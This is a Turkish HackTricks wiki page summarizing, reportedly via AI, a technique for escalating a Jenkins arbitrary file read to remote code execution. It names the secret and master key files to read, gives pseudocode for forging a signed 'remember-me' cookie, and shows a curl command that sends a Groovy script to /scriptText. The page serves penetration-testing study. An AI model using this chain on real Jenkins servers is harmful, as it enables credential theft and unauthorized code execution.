# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

Bu blog yazısında, Jenkins'teki bir Yerel Dosya Dahil Etme açığını RCE'ye dönüştürmenin harika bir yolunu bulabilirsiniz: [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

Bu, bir yerel dosya okuma açığını kullanarak RCE elde etmek için bir keyfiyet çerezi oluşturmanın kötüye kullanıldığı yazının bir kısmının AI tarafından oluşturulmuş özetidir:

### Saldırı Ön Koşulları

* **Özellik Gereksinimi:** "Beni hatırla" etkin olmalıdır (varsayılan ayar).
* **Erişim Düzeyleri:** Saldırganın Genel/Okuma izinlerine ihtiyacı vardır.
* **Gizli Erişim:** Anahtar dosyalardan hem ikili hem de metin içeriğini okuma yeteneği.

### Ayrıntılı Sömürü Süreci

#### Adım 1: Veri Toplama

**Kullanıcı Bilgisi Alma**

* Her kullanıcı için `$JENKINS_HOME/users/*.xml` dosyasından kullanıcı yapılandırması ve gizli bilgileri erişin:
* **Kullanıcı Adı**
* **Kullanıcı tohum**
* **Zaman damgası**
* **Şifre karması**

**Gizli Anahtar Çıkartma**

* Çerezi imzalamak için kullanılan kriptografik anahtarları çıkartın:
* **Gizli Anahtar:** `$JENKINS_HOME/secret.key`
* **Anahtar:** `$JENKINS_HOME/secrets/master.key`
* **MAC Anahtar Dosyası:** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### Adım 2: Çerez Sahteciliği

**Token Hazırlığı**

*   **Token Süre Sonunu Hesapla:**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // Mevcut zamana bir saat ekler
```
{% endcode %}
*   **Token için Verileri Birleştir:**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**MAC Anahtarının Şifre Çözümü**

*   **MAC Anahtar Dosyasını Şifre Çöz:**

```javascript
key = toAes128Key(masterKey)  // Anahtarı AES128 anahtar formatına dönüştür
decrypted = AES.decrypt(macFile, key)  // .mac dosyasını şifre çöz
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**İmza Hesaplama**

*   **HMAC SHA256 Hesapla:**

```javascript
mac = HmacSHA256(token, macKey)  // Token ve MAC anahtarını kullanarak HMAC hesapla
tokenSignature = bytesToHexString(mac)  // MAC'i onaltılık dizeye dönüştür
```

**Çerez Kodlama**

*   **Son Çerezi Oluştur:**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // Çerez verilerini Base64 ile kodla
```
{% endcode %}

#### Adım 3: Kod Çalıştırma

**Oturum Kimlik Doğrulama**

* **CSRF ve Oturum Token'larını Al:**
* `Jenkins-Crumb` almak için `/crumbIssuer/api/json` adresine bir istek yapın.
* Yanıttan `JSESSIONID`'yi yakalayın, bu `remember-me` çerezi ile birlikte kullanılacaktır.

**Komut Çalıştırma İsteği**

*   **Groovy Script ile POST İsteği Gönder:**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* Groovy script, sistem düzeyinde komutları veya Jenkins ortamında diğer işlemleri çalıştırmak için kullanılabilir.

Verilen örnek curl komutu, gerekli başlıklar ve çerezlerle Jenkins'e istek yaparak keyfi kodu güvenli bir şekilde çalıştırmanın nasıl yapılacağını göstermektedir.

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
